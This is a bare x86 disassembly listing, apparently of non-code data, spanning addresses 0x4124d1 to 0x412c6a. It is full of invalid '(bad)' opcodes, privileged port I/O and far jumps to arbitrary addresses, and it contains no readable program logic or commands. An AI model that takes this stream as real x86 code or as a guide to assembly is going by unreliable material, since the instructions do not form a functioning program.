  4124d1:	mov    bh,0x73
  4124d3:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4124d4:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4124d5:	(bad)  
  4124d6:	xchg   edx,eax
  4124d7:	outs   dx,DWORD PTR ds:[esi]
  4124d8:	in     eax,0x87
  4124da:	cwde   
  4124db:	jmp    0xfaa5d595
  4124e0:	xchg   esp,eax
  4124e1:	sub    ebp,edx
  4124e3:	imul   edx,esi,0xc4a780fa
  4124e9:	lahf   
  4124ea:	loope  0x41251e
  4124ec:	fild   WORD PTR [edx-0x5e]
  4124ef:	jnp    0x4124b8
  4124f1:	loop   0x412477
  4124f3:	jge    0x41249f
  4124f5:	jg     0x412551
  4124f7:	jno    0xbc9ed147
  4124fd:	jne    0x41250a
  4124ff:	mov    edi,0x2b994392
  412504:	xchg   ebx,eax
  412505:	mov    bl,BYTE PTR [edx-0x22b8581f]
  41250b:	mov    DWORD PTR [ebp+0x5fa71a92],esp
  412511:	push   0x8d187657
  412516:	dec    eax
  412517:	mov    cl,al
  412519:	jmp    0xc9bc:0xd8ea719a
  412520:	daa    
  412521:	jge    0x4124e9
  412523:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  412524:	mov    edx,0x7e022a3e
  412529:	clc    
  41252a:	outs   dx,DWORD PTR ds:[esi]
  41252b:	adc    ch,BYTE PTR [ebp+0x325089af]
  412531:	ss dec ebp
  412533:	int3   
  412534:	mov    al,0x90
  412536:	(bad)  
  412537:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  412538:	jl     0x4124e3
  41253a:	sbb    ebp,DWORD PTR [eax]
  41253c:	jp     0x412531
  41253e:	aaa    
  41253f:	div    DWORD PTR [edx+0x14a6713e]
  412545:	data16 aas 
  412547:	test   BYTE PTR [ebx+ecx*1+0x317f852e],dh
  41254e:	aad    0x67
  412550:	push   edi
  412551:	push   edx
  412552:	je     0x4125a9
  412554:	mov    dl,0x5a
  412556:	fist   DWORD PTR [ebx+0x4c]
  412559:	stos   DWORD PTR es:[edi],eax
  41255a:	scas   al,BYTE PTR es:[edi]
  41255b:	push   ss
  41255c:	gs mov bl,0x60
  41255f:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  412560:	lds    esi,FWORD PTR [edx]
  412562:	scas   eax,DWORD PTR es:[edi]
  412563:	sub    BYTE PTR [edx],al
  412565:	pop    ecx
  412566:	xor    DWORD PTR [edi-0x72],esp
  412569:	sub    ebx,DWORD PTR [edx-0x412a2632]
  41256f:	aaa    
  412570:	inc    ebp
  412571:	push   0x38
  412573:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  412574:	arpl   WORD PTR [ecx-0x73],cx
  412577:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  412578:	ret    0x9f35
  41257b:	pop    ds
  41257c:	lods   al,BYTE PTR ds:[esi]
  41257d:	xor    DWORD PTR [eax-0x33],0x6fdb57b2
  412584:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  412585:	jp     0x4125e0
  412587:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  412588:	daa    
  412589:	dec    ebp
  41258a:	sbb    DWORD PTR [ebx],0x6a
  41258d:	int    0xb2
  41258f:	jne    0x412525
  412591:	sti    
  412592:	sub    eax,edx
  412594:	mov    dl,0xd4
  412596:	add    al,0x4d
  412598:	inc    ebx
  412599:	out    dx,al
  41259a:	pop    ecx
  41259b:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41259c:	jns    0x412552
  41259e:	shl    DWORD PTR [edx+0x65057373],0x5a
  4125a5:	inc    esp
  4125a6:	call   0x38f1:0xdeba5d4a
  4125ad:	push   ebp
  4125ae:	pop    esi
  4125af:	fist   WORD PTR ds:0x75a737f1
  4125b5:	mov    ah,0x22
  4125b7:	cmp    al,0xf1
  4125b9:	(bad)  
  4125ba:	pop    ecx
  4125bb:	cmp    dh,BYTE PTR [edx+0x3c4c4175]
  4125c1:	sub    BYTE PTR [edi-0x2ef350e6],cl
  4125c7:	call   0x98bf:0x37cdc644
  4125ce:	ins    DWORD PTR es:[edi],dx
  4125cf:	in     al,0xb5
  4125d1:	lds    esi,FWORD PTR [edi+0x2c]
  4125d4:	xor    eax,0xb9568b57
  4125d9:	cmp    eax,esp
  4125db:	pop    es
  4125dc:	imul   esp,DWORD PTR [ecx+0x74],0xee84b25d
  4125e3:	cwde   
  4125e4:	jnp    0x4125a7
  4125e6:	adc    BYTE PTR [edx+0x7],ah
  4125e9:	or     ecx,DWORD PTR [esi-0x285c3b7b]
  4125ef:	adc    BYTE PTR [edx],0x4d
  4125f2:	xchg   esp,eax
  4125f3:	cmp    al,0x3c
  4125f5:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4125f6:	out    dx,al
  4125f7:	pusha  
  4125f8:	int    0xb8
  4125fa:	retf   0x44d7
  4125fd:	add    BYTE PTR [esi],ah
  4125ff:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  412600:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  412601:	cmp    BYTE PTR [ebx+0x565407cd],cl
  412607:	sar    DWORD PTR es:[edi-0x39a3a466],0x76
  41260f:	sbb    bh,ah
  412611:	push   ss
  412612:	cmp    al,0xa5
  412614:	cmp    al,0x45
  412617:	sbb    edx,edx
  412619:	mov    cl,bh
  41261b:	lods   eax,DWORD PTR ds:[esi]
  41261c:	jnp    0x4125d6
  41261e:	stc    
  41261f:	xlat   BYTE PTR ds:[ebx]
  412620:	push   edi
  412621:	mov    edi,0xb4edda7
  412626:	jae    0x41269a
  412628:	(bad)  
  412629:	movups xmm6,xmm1
  41262c:	mov    ch,0xb
  41262e:	test   BYTE PTR [edx-0x42689076],bh
  412634:	sub    eax,0xf8a59ab0
  412639:	adc    edi,DWORD PTR [eax+eax*1]
  41263c:	shl    eax,1
  41263e:	popa   
  41263f:	mov    ebx,0xa76ab86e
  412644:	mov    al,ds:0x28023164
  412649:	and    edx,DWORD PTR [ebp+eiz*2+0x75a6e63]
  412650:	jns    0x412646
  412652:	sub    edx,edx
  412654:	(bad)  
  412655:	or     ecx,DWORD PTR [esi-0x36b28128]
  41265b:	popa   
  41265c:	lods   al,BYTE PTR ds:[esi]
  41265d:	sar    dl,1
  41265f:	rol    BYTE PTR [esi-0x121872a9],1
  412665:	or     ebx,DWORD PTR [eax+0x398d53bb]
  41266b:	addr16 or al,0xe6
  41266e:	mov    ds:0x4f0baf6c,eax
  412673:	dec    edi
  412674:	add    eax,0x4358346b
  412679:	or     ebx,DWORD PTR [eax+esi*8-0x4ff2b608]
  412680:	push   0x13
  412682:	xchg   ebp,eax
  412683:	cli    
  412684:	popa   
  412685:	dec    ebx
  412686:	mov    bh,0x7
  412688:	push   es
  412689:	jnp    0x41265e
  41268b:	xchg   ecx,eax
  41268c:	stc    
  41268d:	or     edx,DWORD PTR [esp+esi*4+0x54]
  412691:	sub    al,0x12
  412693:	and    DWORD PTR [edx],eax
  412695:	jbe    0x4126f7
  412697:	pushf  
  412698:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  412699:	mov    dh,0x5c
  41269b:	(bad)  
  41269c:	dec    ebx
  41269d:	pop    ss
  41269e:	aaa    
  41269f:	test   eax,0x73417fb2
  4126a4:	xchg   ebp,eax
  4126a5:	xor    al,BYTE PTR [edi-0x28]
  4126a8:	pop    ecx
  4126a9:	or     esp,DWORD PTR [esi-0x30d0b93f]
  4126af:	xor    bl,dl
  4126b1:	sbb    BYTE PTR [edx+0x9e783f5],0x27
  4126b8:	push   ebp
  4126b9:	pop    edi
  4126ba:	scas   eax,DWORD PTR es:[edi]
  4126bb:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4126bc:	xchg   ecx,eax
  4126bd:	out    0xe2,al
  4126bf:	in     eax,0x9c
  4126c1:	push   cs
  4126c2:	(bad)  
  4126c3:	iret   
  4126c4:	mov    ebp,0xb59fc3f7
  4126c9:	or     ebp,DWORD PTR [ebx]
  4126cb:	cmc    
  4126cc:	in     eax,0xb2
  4126ce:	shl    BYTE PTR [edi-0x687aa4e2],cl
  4126d4:	push   ebp
  4126d5:	cld    
  4126d6:	jg     0x41274f
  4126d8:	mov    dl,0xd7
  4126da:	mov    dl,0x9e
  4126dc:	xchg   esp,eax
  4126dd:	inc    ebp
  4126de:	lods   eax,DWORD PTR ds:[esi]
  4126e0:	stos   BYTE PTR es:[edi],al
  4126e1:	or     ecx,DWORD PTR [edx-0x46a4d6c8]
  4126e7:	repnz cmp DWORD PTR [ecx-0x66],esp
  4126eb:	inc    esi
  4126ec:	stc    
  4126ed:	in     eax,0x13
  4126ef:	mov    dh,0x98
  4126f1:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4126f2:	cmps   DWORD PTR ss:[esi],DWORD PTR es:[edi]
  4126f4:	cmc    
  4126f5:	sbb    ebx,DWORD PTR [esi+0x66]
  4126f8:	add    BYTE PTR [eax+0x27b2b3ab],ah
  4126fe:	hlt    
  4126ff:	test   BYTE PTR [ebx],0x5c
  412702:	daa    
  412703:	retf   0x52b
  412706:	loop   0x4126e9
  412708:	pop    eax
  412709:	bound  edi,QWORD PTR [edx-0x59e57893]
  41270f:	cmp    dh,BYTE PTR [edx+0x59006f4c]
  412715:	out    dx,eax
  412716:	mov    edx,0x99fb40ad
  41271b:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41271c:	std    
  41271d:	push   es
  41271e:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41271f:	push   ss
  412720:	imul   DWORD PTR fs:[esi]
  412723:	mov    dh,BYTE PTR [edx-0x5d840a6]
  412729:	mov    ds:0xb853a88,al
  41272e:	mov    WORD PTR [ebx],ds
  412730:	(bad)  
  412731:	fisubr WORD PTR [ecx+0x31]
  412734:	mov    al,0x76
  412736:	call   0xe055:0x250a3601
  41273d:	add    eax,eax
  41273f:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  412740:	adc    BYTE PTR [edi],ah
  412742:	add    BYTE PTR ds:0xd32f176,dh
  412748:	pop    esi
  412749:	add    eax,DWORD PTR [esi-0x65b42ae4]
  41274f:	add    ebx,edx
  412751:	jb     0x4127ca
  412753:	dec    esi
  412754:	jge    0x412761
  412756:	xor    eax,0x879bdba8
  41275b:	addr16 rol edx,1
  41275e:	call   0xd3d1:0x48934bda
  412765:	xor    al,0x97
  412767:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  412768:	repz mov edx,eax
  41276b:	or     ebx,0x2a
  41276e:	xchg   esp,eax
  41276f:	xchg   esp,eax
  412770:	dec    eax
  412771:	cmp    bl,BYTE PTR [edx-0x4505f486]
  412777:	mov    dl,0x89
  412779:	hlt    
  41277a:	in     eax,dx
  41277b:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41277c:	cld    
  41277d:	sbb    DWORD PTR [ebp*4+0x222120a8],esp
  412784:	mov    dl,0x52
  412786:	loope  0x41271c
  412788:	mov    BYTE PTR [edx],bh
  41278a:	inc    eax
  41278b:	(bad)  
  41278c:	or     eax,0x9f25702d
  412791:	or     eax,esp
  412793:	fnstenv [edx+0x13]
  412796:	sub    BYTE PTR [ebp-0x76],dl
  412799:	popa   
  41279a:	(bad)  
  41279b:	pop    ebx
  41279c:	mov    bh,0xb2
  41279e:	sbb    al,0x5d
  4127a0:	jns    0x412819
  4127a2:	pop    ecx
  4127a3:	adc    esi,DWORD PTR [esi+0x4173888]
  4127a9:	adc    al,0xd5
  4127ab:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4127ac:	jno    0x412767
  4127ae:	push   ds
  4127af:	or     DWORD PTR [esi+edi*2],ebp
  4127b2:	pop    ebx
  4127b3:	inc    ebx
  4127b4:	outs   dx,DWORD PTR ds:[esi]
  4127b5:	jae    0x412751
  4127b7:	pop    ss
  4127b8:	xchg   esp,eax
  4127b9:	aaa    
  4127ba:	and    al,dh
  4127bc:	sbb    esp,ebp
  4127be:	bound  esp,QWORD PTR [eax+ecx*4-0xa6114bb]
  4127c5:	sti    
  4127c6:	jp     0x4127d7
  4127c8:	or     eax,0x135d9b12
  4127cd:	daa    
  4127ce:	pop    ebp
  4127cf:	rcr    BYTE PTR [edx+esi*8],1
  4127d2:	jle    0x412850
  4127d4:	je     0x4127da
  4127d6:	out    dx,al
  4127d7:	stos   DWORD PTR es:[edi],eax
  4127d8:	out    dx,al
  4127d9:	pop    esi
  4127da:	jge    0x412811
  4127dc:	push   ebx
  4127dd:	mov    ebp,DWORD PTR [edx+0x78]
  4127e0:	std    
  4127e1:	jno    0x41277d
  4127e3:	mov    ds:0x7574d3b3,al
  4127e8:	scas   al,BYTE PTR es:[edi]
  4127e9:	cmp    eax,0xb5d5a7d0
  4127ee:	loop   0x4127c7
  4127f0:	adc    BYTE PTR [eax+0x29],cl
  4127f3:	mov    eax,0x9680249c
  4127f8:	lods   eax,DWORD PTR ds:[esi]
  4127f9:	cmp    dh,ah
  4127fb:	fdiv   QWORD PTR [edx-0x285008e3]
  412801:	hlt    
  412802:	sbb    al,0xf8
  412804:	sbb    BYTE PTR [eax+edx*8],0x68
  412808:	je     0x412814
  41280a:	es push edx
  41280c:	lods   al,BYTE PTR ds:[esi]
  41280d:	jge    0x412889
  41280f:	jg     0x4127d3
  412811:	xor    bl,BYTE PTR [edx+0x4d5b974b]
  412817:	jno    0x412892
  412819:	xchg   esi,eax
  41281a:	mov    ds:0x697fefa0,al
  41281f:	dec    ecx
  412820:	mov    ch,0xcb
  412822:	outs   dx,DWORD PTR ds:[esi]
  412823:	sub    eax,0x2c8d8cb0
  412828:	sti    
  412829:	jmp    0xb8ae:0x6fa5d09a
  412830:	dec    ebx
  412831:	or     ecx,DWORD PTR [edx+eiz*4+0x40539a16]
  412838:	repz scas al,BYTE PTR es:[edi]
  41283a:	xchg   DWORD PTR [ebx],edi
  41283c:	in     al,0x2
  41283e:	cmps   BYTE PTR fs:[esi],BYTE PTR es:[edi]
  412840:	dec    esp
  412841:	inc    esi
  412842:	test   al,0xb7
  412844:	imul   eax,DWORD PTR [ebx],0xb224a6a
  41284a:	push   cs
  41284b:	inc    esi
  41284c:	ret    
  41284d:	push   0xfffffff7
  41284f:	adc    ecx,edx
  412851:	adc    eax,0xa9446e99
  412856:	(bad)  [ebx+0x36]
  412859:	jecxz  0x41287a
  41285b:	jp     0x412810
  41285d:	or     esi,DWORD PTR [ebp+ebx*8-0x6c7d7bd0]
  412864:	pop    ds
  412865:	mov    ah,0xeb
  412867:	sub    ch,BYTE PTR [esi-0x4c926930]
  41286d:	cld    
  41286e:	xchg   edx,eax
  41286f:	aaa    
  412870:	xchg   edx,eax
  412871:	push   0xbad73fa
  412876:	lods   eax,DWORD PTR ds:[esi]
  412877:	mov    al,ds:0xb5e6e4b7
  41287c:	arpl   bp,dx
  41287e:	call   0x2751:0xb8ca13cb
  412885:	push   edi
  412886:	push   esi
  412887:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  412888:	stos   BYTE PTR es:[edi],al
  412889:	lds    ecx,FWORD PTR [edx+0x73cd31e6]
  41288f:	jbe    0x412843
  412891:	sub    BYTE PTR [edx-0x33],dh
  412894:	inc    ecx
  412895:	jns    0x41290e
  412897:	and    BYTE PTR [edi+0x4],ch
  41289a:	inc    ebp
  41289b:	in     eax,0x8b
  41289d:	push   esi
  41289e:	cmp    cl,BYTE PTR [edi+0x2a44b29c]
  4128a4:	sahf   
  4128a5:	mov    al,ds:0x83b34402
  4128aa:	cli    
  4128ab:	stc    
  4128ac:	mov    ?,WORD PTR [edx]
  4128ae:	push   esi
  4128af:	mov    ah,0xaf
  4128b1:	or     ecx,ebp
  4128b3:	test   al,0x6b
  4128b5:	xchg   ecx,eax
  4128b6:	arpl   cx,bx
  4128b8:	rcr    DWORD PTR [esi],1
  4128ba:	popf   
  4128bb:	jl     0x412895
  4128bd:	lock (bad) 
  4128bf:	jecxz  0x412893
  4128c1:	or     eax,0xb763965
  4128c6:	add    eax,ebx
  4128c8:	fsub   QWORD PTR [edx]
  4128ca:	jmp    0xf16d:0x9a162931
  4128d1:	fisub  DWORD PTR [ecx-0x25aab228]
  4128d7:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4128d8:	rol    DWORD PTR [ecx+0x3fbeadc7],1
  4128de:	pop    ebx
  4128df:	fdiv   QWORD PTR [edx+0x34cb0c90]
  4128e5:	xor    eax,0xc18d291
  4128ea:	pusha  
  4128eb:	inc    esi
  4128ec:	push   ecx
  4128ed:	fs das 
  4128ef:	pop    es
  4128f0:	dec    dh
  4128f2:	rol    DWORD PTR [edi-0x45212e4e],1
  4128f8:	mov    ebp,0xf8b52203
  4128fd:	or     al,0xce
  4128ff:	sahf   
  412900:	inc    esi
  412901:	pop    edx
  412902:	add    ah,BYTE PTR [edi-0x80]
  412905:	jno    0x412898
  412907:	fs mov dl,0xd1
  41290a:	cmp    al,0x68
  41290c:	out    dx,eax
  41290d:	cmc    
  41290e:	or     al,BYTE PTR [eax+0x57a26bd5]
  412914:	mov    edi,0xb20d1f5d
  412919:	sub    BYTE PTR [esi-0x43],dl
  41291c:	imul   ebp,DWORD PTR [esi+0x791a1a22],0x4
  412923:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  412924:	pop    ds
  412925:	xchg   edi,eax
  412926:	sub    al,BYTE PTR [ecx+0x49]
  412929:	call   0xeb06dffd
  41292e:	call   0xf972:0x1560e598
  412935:	popf   
  412936:	mov    edi,0x955d7ea7
  41293b:	call   0x8d9901a5
  412940:	mov    ch,0x47
  412942:	or     bh,bl
  412944:	mov    esi,0x69333a8a
  412949:	sbb    ebp,DWORD PTR ds:0x10b8ed0
  41294f:	pop    ss
  412950:	adc    al,0x14
  412952:	shl    esp,1
  412954:	sub    ebp,0xa1654796
  41295a:	jnp    0x41295f
  41295c:	push   ecx
  41295d:	or     edi,DWORD PTR ds:0xd6d4be2
  412963:	jl     0x41290c
  412965:	inc    edx
  412966:	lahf   
  412967:	rol    BYTE PTR [ebx],0xfc
  41296a:	rcr    DWORD PTR [eax],1
  41296c:	xor    al,BYTE PTR [eax+0x7e]
  41296f:	dec    edi
  412970:	dec    ecx
  412971:	add    eax,0x76bc68cf
  412976:	jp     0x41295d
  412978:	in     al,0x1f
  41297a:	push   cs
  41297b:	cs mov ebp,0x6c80d370
  412981:	dec    esp
  412982:	and    bl,BYTE PTR [ebx]
  412984:	mov    dl,0x2f
  412986:	cdq    
  412987:	stc    
  412988:	test   al,0x4
  41298a:	rcl    dl,cl
  41298c:	adc    edx,DWORD PTR ds:0x4e53d59a
  412992:	das    
  412993:	xchg   BYTE PTR [edx-0x4f637709],dh
  412999:	lahf   
  41299a:	out    0x4b,al
  41299c:	aas    
  41299d:	or     ebx,DWORD PTR [edx]
  41299f:	adc    al,0xa
  4129a1:	inc    edx
  4129a2:	in     eax,dx
  4129a3:	popa   
  4129a4:	cli    
  4129a5:	sub    eax,0x38b88e9a
  4129aa:	in     al,0xaa
  4129ac:	inc    esi
  4129ad:	aaa    
  4129ae:	jmp    0xbeb6:0x9c9564a7
  4129b5:	popf   
  4129b6:	mov    cs,WORD PTR [eax-0x4e]
  4129b9:	xchg   edx,eax
  4129ba:	and    dh,0x2
  4129bd:	pop    esp
  4129be:	mov    BYTE PTR [ebx+0x39],dh
  4129c1:	or     ebx,DWORD PTR [edi+0x3a]
  4129c4:	cmp    edi,DWORD PTR [ebx]
  4129c6:	mov    dh,0x20
  4129c8:	retf   0x9a83
  4129cb:	xchg   esp,eax
  4129cc:	jbe    0x4129c2
  4129ce:	shl    bh,cl
  4129d0:	dec    ecx
  4129d1:	adc    eax,0xa456a697
  4129d6:	or     DWORD PTR ds:0x673bc346,esp
  4129dc:	nop
  4129dd:	pop    es
  4129de:	xchg   ebp,eax
  4129df:	pop    eax
  4129e0:	cld    
  4129e1:	repz das 
  4129e3:	addr16 retf 
  4129e5:	sub    BYTE PTR [ebp-0x23f48482],bh
  4129eb:	inc    edx
  4129ec:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4129ed:	leave  
  4129ee:	iret   
  4129ef:	in     eax,0x93
  4129f1:	jmp    0x5669e591
  4129f6:	adc    BYTE PTR [ecx],cl
  4129f8:	push   ebp
  4129f9:	push   ss
  4129fa:	bound  ebx,QWORD PTR [esi]
  4129fc:	loopne 0x412a09
  4129fe:	ret    
  4129ff:	daa    
  412a00:	jle    0x4129d6
  412a02:	shr    esi,0x3
  412a05:	(bad)  [eax+0x3e]
  412a08:	mov    dl,0xd3
  412a0a:	inc    eax
  412a0b:	dec    edx
  412a0c:	enter  0x5c39,0x8
  412a10:	sbb    cl,BYTE PTR [ebx]
  412a12:	shl    DWORD PTR [ecx],1
  412a14:	dec    edx
  412a15:	sub    esp,ebp
  412a17:	cmp    eax,0x359a868a
  412a1c:	test   al,0xec
  412a1e:	popf   
  412a1f:	dec    ecx
  412a20:	push   eax
  412a21:	sar    DWORD PTR [edi+ebp*8],0x21
  412a25:	pop    fs
  412a27:	in     al,dx
  412a28:	mov    dl,0x17
  412a2a:	pusha  
  412a2b:	add    al,0xea
  412a2d:	pop    eax
  412a2e:	sub    cl,BYTE PTR ds:0x5c851cb2
  412a34:	outs   dx,DWORD PTR ds:[esi]
  412a35:	cmp    DWORD PTR [ebp+0x2e7561ce],edi
  412a3b:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  412a3c:	mov    edi,0x3f40f4b1
  412a41:	repnz mov eax,0x7e3d9e67
  412a47:	lods   al,BYTE PTR ds:[esi]
  412a48:	mov    dl,0xe3
  412a4a:	int    0x1c
  412a4c:	mov    dh,0xfc
  412a4e:	sub    DWORD PTR [ebx+0x278cb4e0],edi
  412a54:	mov    al,0xc3
  412a56:	jg     0x412a67
  412a58:	fidiv  WORD PTR [ebp-0x66]
  412a5b:	(bad)  
  412a5d:	mov    esi,0x9ea65c4b
  412a62:	jo     0x412a0b
  412a64:	ret    0xf3ae
  412a67:	pop    ds
  412a68:	xchg   esi,eax
  412a69:	(bad)  
  412a6a:	les    esi,FWORD PTR [esi]
  412a6c:	mov    cl,0x33
  412a6e:	mov    dl,0x64
  412a70:	mov    al,0x2c
  412a72:	xor    BYTE PTR [eax],cl
  412a74:	xchg   edx,eax
  412a75:	add    DWORD PTR [ebp-0x7f45e94],0x57df8f94
  412a7f:	je     0x412a5e
  412a81:	sbb    DWORD PTR [ebx+0xf8c2995],ebx
  412a87:	test   al,0x2d
  412a89:	loopne 0x412acd
  412a8b:	add    al,BYTE PTR es:[edi-0x8]
  412a8f:	nop
  412a90:	mov    dl,0x43
  412a92:	sub    eax,0xe021d7c3
  412a97:	scas   al,BYTE PTR es:[edi]
  412a98:	mov    ch,0xb1
  412a9a:	pop    ebx
  412a9b:	popa   
  412a9c:	lahf   
  412a9d:	das    
  412a9e:	pop    edx
  412a9f:	xchg   ebp,eax
  412aa0:	push   ebp
  412aa1:	jae    0x412b18
  412aa3:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  412aa4:	pop    edi
  412aa5:	sub    BYTE PTR gs:[edi+ebx*8-0x13],ah
  412aaa:	adc    edi,DWORD PTR [ecx]
  412aac:	in     eax,dx
  412aad:	sub    dl,BYTE PTR cs:[edx+0x743b0b1b]
  412ab4:	lock cmp ch,BYTE PTR [edi-0x65ba6109]
  412abb:	fisub  WORD PTR [edi-0x72]
  412abe:	cmp    DWORD PTR [ebx+eiz*4],edi
  412ac1:	(bad)  
  412ac2:	ror    BYTE PTR [ebx-0x47829591],cl
  412ac8:	ror    al,1
  412aca:	or     cl,BYTE PTR [eax-0x1ab51a47]
  412ad0:	inc    ebx
  412ad1:	sahf   
  412ad2:	cdq    
  412ad3:	loop   0x412aa0
  412ad5:	xor    dh,BYTE PTR [edx-0x55f424a8]
  412adb:	std    
  412adc:	add    eax,0x218785aa
  412ae1:	jle    0x412acb
  412ae3:	dec    ecx
  412ae4:	mov    cl,0x4d
  412ae6:	fbld   TBYTE PTR [edi-0x6f]
  412ae9:	hlt    
  412aea:	jecxz  0x412b53
  412aec:	and    ah,BYTE PTR ds:0x2ed6a796
  412af2:	mov    ebx,edi
  412af4:	inc    edx
  412af5:	push   ebp
  412af6:	adc    al,0x8b
  412af8:	mov    esp,0x6291c52c
  412afd:	dec    ebx
  412afe:	add    cl,BYTE PTR [ebx-0x52]
  412b01:	push   ecx
  412b02:	test   DWORD PTR [esi+0x5384c980],edx
  412b08:	pop    ds
  412b09:	(bad)  
  412b0a:	stos   BYTE PTR es:[edi],al
  412b0b:	push   eax
  412b0c:	mov    ch,0x8d
  412b0e:	and    ebp,DWORD PTR [edx]
  412b10:	cwde   
  412b11:	inc    edx
  412b12:	sub    ebp,DWORD PTR [esi]
  412b14:	data16 in al,dx
  412b16:	dec    esi
  412b17:	cmp    edi,esi
  412b19:	xor    bl,ah
  412b1b:	inc    ecx
  412b1c:	xor    bl,BYTE PTR [esi+0x7b7447d4]
  412b22:	dec    edx
  412b23:	or     al,0xb2
  412b25:	enter  0x407b,0xf6
  412b29:	push   ecx
  412b2a:	cli    
  412b2b:	jp     0x412af8
  412b2d:	or     esi,DWORD PTR [ebp+ecx*2-0x228385fb]
  412b34:	xchg   esp,eax
  412b35:	dec    esi
  412b36:	call   0x780f:0xdde9cc92
  412b3d:	xor    eax,DWORD PTR [edx+0x5a44e0a6]
  412b43:	jg     0x412bba
  412b45:	xchg   edx,eax
  412b46:	(bad)  
  412b47:	xlat   BYTE PTR ds:[ebx]
  412b48:	sbb    eax,0x989a9ae6
  412b4d:	jg     0x412b28
  412b4f:	(bad)  
  412b50:	(bad)  
  412b51:	mov    esi,0x112aa74c
  412b56:	ror    ebx,cl
  412b58:	xor    eax,0xbdc0754e
  412b5d:	cs je  0x412afd
  412b60:	or     ebp,DWORD PTR cs:[ecx-0x3b]
  412b64:	push   edi
  412b65:	mov    DWORD PTR [ebx-0x59],ecx
  412b68:	mov    dh,ch
  412b6a:	inc    edx
  412b6b:	inc    BYTE PTR [edx-0x4d0eca80]
  412b71:	adc    edi,DWORD PTR [edx-0x7b]
  412b74:	cmp    eax,0x773c96bd
  412b79:	or     eax,DWORD PTR [ecx-0x5b4b0149]
  412b7f:	mov    ds,esp
  412b81:	jne    0x412b90
  412b83:	daa    
  412b84:	sbb    eax,0x55786599
  412b89:	or     eax,DWORD PTR [ecx+0x1a]
  412b8c:	inc    ecx
  412b8d:	mov    ebp,0x2088979c
  412b92:	popf   
  412b93:	cdq    
  412b94:	dec    esp
  412b95:	int    0xbf
  412b97:	pop    ss
  412b98:	inc    edx
  412b99:	sbb    ebx,DWORD PTR [ebp+0x410eeae5]
  412b9f:	call   0x172:0x1d370e7e
  412ba6:	(bad)  
  412ba8:	hlt    
  412ba9:	or     ecx,edx
  412bab:	mov    al,0x64
  412bad:	out    dx,eax
  412bae:	mov    eax,ds:0x9abb4472
  412bb3:	pop    eax
  412bb4:	dec    ebx
  412bb5:	cmp    bl,dh
  412bb7:	add    BYTE PTR [eax-0x42475718],bl
  412bbd:	jnp    0x412b50
  412bbf:	mov    DWORD PTR [ebx+ecx*1-0x3ec67759],eax
  412bc6:	or     DWORD PTR [ecx+0xc715eb2],0xffffffdb
  412bcd:	dec    edi
  412bce:	in     eax,0xd2
  412bd0:	fimul  DWORD PTR [ebx]
  412bd2:	in     eax,dx
  412bd3:	in     eax,dx
  412bd4:	mov    al,ds:0xadd9d36d
  412bd9:	fistp  DWORD PTR [edx-0xb5d4e82]
  412bdf:	mov    esp,0xa7ae3be7
  412be4:	mov    DWORD PTR [ecx],eax
  412be6:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  412be7:	pusha  
  412be8:	cmc    
  412be9:	push   0xd6a92ce4
  412bee:	lea    ebx,[edx+0x1e]
  412bf1:	mov    bl,0xcc
  412bf3:	add    al,0x58
  412bf5:	or     al,0x9e
  412bf7:	mov    ?,WORD PTR [edi]
  412bf9:	fnstenv [edi]
  412bfb:	inc    edi
  412bfc:	add    al,BYTE PTR [esi+eax*8-0x3e]
  412c00:	mov    dl,0x34
  412c02:	sub    eax,0x59b57fa2
  412c07:	and    eax,0xa7a1ef12
  412c0c:	sbb    al,0xf3
  412c0e:	xchg   DWORD PTR [eax-0x16e22024],eax
  412c14:	mov    ebp,0x9b1c246
  412c19:	jmp    0x412c46
  412c1b:	nop
  412c1c:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  412c1d:	push   eax
  412c1e:	(bad)  [edi+0x2b]
  412c21:	or     esp,DWORD PTR [edi+0x7a]
  412c24:	mov    edx,0x8c2e91bd
  412c29:	pop    ebx
  412c2a:	cdq    
  412c2b:	fist   DWORD PTR [edx+0x136a7111]
  412c31:	retf   
  412c32:	in     eax,dx
  412c33:	test   eax,0x3af20405
  412c38:	lea    ebp,[edx+ebx*1-0x17c63d7f]
  412c3f:	mov    ecx,DWORD PTR [esi-0x5245bdb5]
  412c45:	fistp  WORD PTR [edx]
  412c47:	les    esp,FWORD PTR [edi+0xe]
  412c4a:	sbb    DWORD PTR [edx+0x15],ebp
  412c4d:	xor    al,0x2
  412c4f:	div    DWORD PTR [edx+0x301c7b85]
  412c55:	or     esp,ebp
  412c57:	cmp    bh,dl
  412c59:	xchg   edi,eax
  412c5a:	std    
  412c5b:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  412c5c:	mov    esi,0xdd96a702
  412c61:	std    
  412c62:	shl    DWORD PTR [esi-0x74f2251],0xe8
  412c69:	stos   DWORD PTR es:[edi],eax
  412c6a:	ret    0xab87
